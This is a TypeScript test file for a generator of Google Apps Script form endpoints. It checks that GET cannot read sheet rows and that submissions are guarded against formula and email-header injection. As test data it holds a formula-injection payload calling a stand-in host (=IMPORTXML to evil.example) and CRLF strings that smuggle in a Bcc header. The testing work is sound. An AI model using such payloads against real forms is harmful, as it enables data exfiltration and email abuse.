import { test } from 'node:test';
import assert from 'node:assert/strict';
import { generateSiteScript } from './siteScript.ts';

const CAPS = { email: true, captcha: true };

/** The doGet half of the generated source — everything before doPost. */
function doGetSource(src: string): string {
  const start = src.indexOf('function doGet');
  const end = src.indexOf('function doPost');
  assert.ok(start !== -1 && end > start, 'expected both doGet and doPost in the output');
  return src.slice(start, end);
}

test('doGet never reads the spreadsheet', () => {
  const doGet = doGetSource(generateSiteScript(CAPS));
  assert.doesNotMatch(doGet, /getDataRange/, 'doGet must not read sheet rows');
  assert.doesNotMatch(doGet, /findTab/, 'doGet must not resolve a tab');
});

test('the endpoint ignores a tab parameter on GET', () => {
  // Guards the regression directly: `?tab=contact` used to return every row.
  assert.doesNotMatch(generateSiteScript(CAPS), /e\.parameter\.tab/);
});

test('doPost still accepts submissions, and only into form tabs', () => {
  const src = generateSiteScript(CAPS);
  assert.match(src, /tabDef\.type !== 'form'/);
  assert.match(src, /sheet\.appendRow\(rowData\)/);
});

test('capability blocks stay opt-in', () => {
  const bare = generateSiteScript({ email: false, captcha: false });
  assert.doesNotMatch(bare, /MailApp\.sendEmail/);
  assert.doesNotMatch(bare, /turnstile/);
  assert.match(generateSiteScript(CAPS), /MailApp\.sendEmail/);
});

test('submitted values cannot become spreadsheet formulas', () => {
  const src = generateSiteScript(CAPS);
  // The row builder must route every submitted value through the guard.
  assert.match(src, /return textOnly\(fields\[key\] !== undefined/);

  // Behavioural check on the emitted helper itself.
  const fn = src.match(/function textOnly[\s\S]*?\n}/)?.[0];
  assert.ok(fn, 'textOnly should be present in the generated script');
  const textOnly = new Function(`${fn}; return textOnly;`)() as (v: string) => string;

  for (const attack of ['=IMPORTXML("https://evil.example")', '+1', '-1', '@x', '\tx', '\rx']) {
    assert.equal(textOnly(attack), `'${attack}`, `${JSON.stringify(attack)} must be forced to text`);
  }
  for (const ok of ['plain text', '2026-01-01', '', 'a=b', 'you@example.com']) {
    assert.equal(textOnly(ok), ok, `${JSON.stringify(ok)} must be left alone`);
  }
});

test('notification email escapes every attacker-controlled string', () => {
  const src = generateSiteScript(CAPS);
  // Field NAMES come straight from the POST body, so they are attacker-chosen.
  assert.match(src, /\+ esc\(k\) \+/);
  assert.doesNotMatch(src, /color:#9ca3af;">' \+ k \+/, 'field name interpolated unescaped');
  assert.match(src, /esc\(tabDef\.label\)/);
  assert.match(src, /esc\(siteName\)/);
});

// ─── v3: subject merge tags + reply-to ───────────────────────────────────────

/** Pull a top-level function out of the generated script and run it for real. */
function emitted<T>(src: string, name: string): T {
  const fn = src.match(new RegExp(`function ${name}\\([\\s\\S]*?\\n}`))?.[0];
  assert.ok(fn, `${name} should be present in the generated script`);
  return new Function(`${fn}; return ${name};`)() as T;
}

test('the delivered subject goes through the merge-tag renderer', () => {
  const src = generateSiteScript(CAPS);
  assert.match(src, /var subject = renderSubject_\(formConf\.emailSubject, fields,/);
  assert.doesNotMatch(src, /var subject = formConf\.emailSubject \|\|/, 'raw template must not be used directly');
  assert.doesNotMatch(generateSiteScript({ email: false, captcha: false }), /renderSubject_/);
});

test('the emitted renderer resolves tags and blocks header injection', () => {
  const render = emitted<(t: string, f: Record<string, unknown>, d: string) => string>(
    generateSiteScript(CAPS), 'renderSubject_');
  const t = 'Acme website contact form - {{applicant_name}} - {{type_of_job}}';
  assert.equal(render(t, { applicant_name: 'Ann Lee', type_of_job: 'Roofing' }, 'D'),
    'Acme website contact form - Ann Lee - Roofing');
  const injected = render(t, { applicant_name: 'x\r\nBcc: victim@example.com', type_of_job: 'y' }, 'D');
  assert.doesNotMatch(injected, /[\r\n]/);
  assert.doesNotMatch(render(t, {}, 'D'), /\{\{|\}\}/, 'unresolved tags must never be delivered');
});

test('reply-to only accepts a plain address from the submission', () => {
  const src = generateSiteScript(CAPS);
  assert.doesNotMatch(src, /opts\.replyTo = String\(fields\[formConf\.replyToField\]\)/);
  const re = src.match(/if \(replyTo && (\/.*\/)\.test\(replyTo\)\)/)?.[1];
  assert.ok(re, 'reply-to guard should be present');
  const ok = new Function(`return ${re};`)() as RegExp;
  assert.ok(ok.test('ann@example.com'));
  for (const bad of ['ann@example.com\r\nBcc: x@y.z', 'a@b.com, c@d.com', 'not an email', '<a@b.com>']) {
    assert.ok(!ok.test(bad), `${JSON.stringify(bad)} must be rejected`);
  }
});

test('every generated variant is valid JavaScript', () => {
  for (const email of [true, false]) for (const captcha of [true, false]) {
    assert.doesNotThrow(() => new Function(generateSiteScript({ email, captcha })), `email=${email} captcha=${captcha}`);
  }
});
